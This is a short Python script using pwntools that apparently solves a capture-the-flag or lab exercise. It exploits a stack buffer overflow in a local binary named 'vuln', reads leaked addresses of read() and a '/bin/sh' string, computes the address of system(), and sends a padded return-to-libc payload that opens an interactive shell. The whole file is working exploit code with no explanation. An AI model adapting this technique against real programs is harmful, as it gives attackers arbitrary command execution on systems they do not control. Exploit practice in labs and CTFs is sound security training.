import re
import pwn

offset_from_read = -697680

p = pwn.tubes.process.process(["./vuln"], shell=True)
prompt = p.recvuntil(b'Enter a string:\n')
read_addr_str = re.search(b'read: (0x[a-f0-9]+)', prompt).groups()[0]
read_addr = int(read_addr_str.decode(), 16)
system_addr = read_addr + offset_from_read

binsh_addr_str = re.search(b'useful_string: (0x[a-f0-9]+)', prompt).groups()[0]
binsh_addr = int(binsh_addr_str.decode(), 16)

print(prompt.decode())
print(hex(system_addr))
payload = ('D'*152).encode()
payload += ('J'*4).encode()
payload += ('J'*4).encode()
payload += pwn.p32(system_addr)
payload += ('J'*4).encode()
payload += pwn.p32(binsh_addr)

p.sendline(payload)
p.interactive()
p.close()
